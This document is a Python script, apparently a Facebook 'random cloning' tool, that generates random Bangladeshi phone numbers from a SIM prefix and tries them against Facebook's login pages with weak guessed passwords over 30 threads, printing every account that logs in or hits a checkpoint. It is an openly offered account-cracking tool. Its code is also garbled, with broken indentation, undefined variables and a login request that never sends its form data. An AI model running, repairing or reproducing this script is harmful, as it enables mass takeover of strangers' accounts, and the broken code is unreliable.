#WRITTEN BY MR.SHIPU
#--------------- import ---------------#
import os
from os import system as clr
import random
import string
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
#---------------colour---------------#
bblack="\033[1;30m"      # Black
M="\033[1;31m"        # Red
H="\033[1;32m"     # Green
byellow="\033[1;33m"     #Yellow
bblue="\033[1;34m"       # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"         # Cyan
B="\033[1;37m"         # White
my_color = [
BC.PH]
warna = random.choice(my_color)
oks=[]
cps=[]
look=0
#------------------logo------------------#
logo =( f"""\x1b[38;5;46m
 /$$      /$$ /$$$$$$$         /$$$$$$  /$$   /$$ /$$$$$$ /$$$$$$$  /$$   /$$      
| $$$    /$$$| $$__  $$       /$$__  $$| $$  | $$|_  $$_/| $$__  $$| $$  | $$      
| $$$$  /$$$$| $$  \ $$      | $$  \__/| $$  | $$  | $$  | $$  \ $$| $$  | $$      
| $$ $$/$$ $$| $$$$$$$/      |  $$$$$$ | $$$$$$$$  | $$  | $$$$$$$/| $$  | $$      
| $$  $$$| $$| $$__  $$       \____  $$| $$__  $$  | $$  | $$____/ | $$  | $$      
| $$\  $ | $$| $$  \ $$       /$$  \ $$| $$  | $$  | $$  | $$      | $$  | $$      
| $$ \/  | $$| $$  | $$      |  $$$$$$/| $$  | $$ /$$$$$$| $$      |  $$$$$$/      
|__/     |__/|__/  |__/       \______/ |__/  |__/|______/|__/       \______/                                                                                                                                                                                                                                                             
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CREATE : SHIPU(™️)
\033[0;92m • RANDOM CLONING (🔥)
\033[0;92m • VERSION CODE [0.1] FIRE (😍)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
#---------------linex def ---------------#
def linex():
	  print(f'{warna}-----------------------------------------{B}')
#--------------clear def ------------#
 def clear():
 	clr('clear')
    print(logo)
#---------------main def --------------#
def MR_SHIPU():
	clear()
	print(f'{B} [{warna}01{B}] RANDOM CLONING ')
	print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
	linex()
	option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
	if option in ['017','1']:
		BD_CLONING()
    else
         exit(' Thanks for using dear :)')
#--------------- bd clone def --------------#
def BD_CLONING():
	 user=[]
     clear
     print (' EXAMPLE SIM CODE : [016] [017] [018] [019]')
     code=input(' ENTER SIM CODE >> ')
     linex()
     print (' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
     try:
        limit=int(input(' ENTER LIMIT >> '))
     except ValueError:
     	limit=50000
     clear()
     for nmbr in range(limit):
     	nmp=".join(random.choice(string.digits) for _ in range (8))
         user.append(nmp)
     with tred(max_workers=30) as Shipu:
     	tl+str(len(user))
         print(' TOTAL ACCOUNT : '+tl)
         print(' YOUR SIM CODE : '+code)
         print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
         for psx in user:
         	ids=code+psx
             passlist=[pax,ids]
             Shipu.submit(method_crack,ids,passlist)
      linex()
      print(' THE PROGRESS HAS BEEN COMPLETE ')
      input(' PRESS ENTER TO BACK : ')
      MR_SHIPU()
#-------------- method chack def ----------#
def method_crack(ids,passlist):
 	global oks
     global cps
     global loop
      try:
      	for pass in passlist:
      	   session=requests.Session()
             free_fb=session.get('https://free.facebook.com').text
             datax={
                  "Isd":re.search('name="Isd" value="(.*?)"',str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"',str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"',str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"',str(free_fb)).group(1),
             "try_number":"0",
             "unrecognized_tries":"0",
             "email":ids,
             "pass":pas,
             "login":"Log In"}              
header={'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'dark',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"22111317PI"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'viewport-width': '980',}
    reqx=session.post('https://p.facebook.com/?stype=lo&deoia=1&jlou=AfdFb5omcityPZEbtDgERMgAMnu_ijObeWsmRlujYM70YNwh_PaqkmkArzTiOE1otAU_H0_aBB5lE0YvCD3mD_Ee4Bc7Xzmm2o6WyHaMmWTXQg&smuh=30110&lh=Ac_k3C7B8irQ3kJ2bc4&wtsid=rdr_0dUYjiQTSbShpc0tn&_rdr',)
    req=session.cookies.get_dict().keys()
    if 'c_user' in req:
   	 print('\r\r \033[1;32m[PING-OK] '+ids+' | '+pas+'\033[1;37m')
        oks.append(ids) 
        break
    elif 'checkpoint' in req:
    	print('\r\r \033[1;30m[PING-CK] '+ids+' | '+pas+'\033[1;37m')
        cps.append(ids)
        break
    else:
    	continue
  look+=1
except:
	pass
#---------------end-----------------------#
MR_SHIPU()
